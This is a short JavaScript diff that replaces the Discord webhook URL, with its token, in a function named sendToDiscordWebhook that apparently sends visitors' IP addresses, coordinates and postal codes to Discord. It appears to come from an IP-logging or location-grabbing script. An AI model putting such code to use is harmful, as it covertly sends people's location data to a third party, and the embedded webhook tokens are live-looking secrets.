@@ -67,7 +67,7 @@ async function sendToDiscordWebhook(ipAddress, coordinates, postalCode) {
     console.debug('Sending data to Discord webhook...');
     
     // Your Discord webhook URL
-    const webhookUrl = 'https://discord.com/api/webhooks/1402759827490340925/z-DDNtNjRZV-ODD7afwZQsfRaJKZKJPkA126OHF8NgfTt9nC8reIUp6LUpiplz3HfpN9';
+    const webhookUrl = 'https://discord.com/api/webhooks/1403068541904621679/mEKTtTHAdwlGogUWbVyx4eGMBDffIgEJCtJPYgNmwWN38G89ix8h0-mWUVgxNQBWafMX';
 
     // Prepare the message content
     const messageContent = `
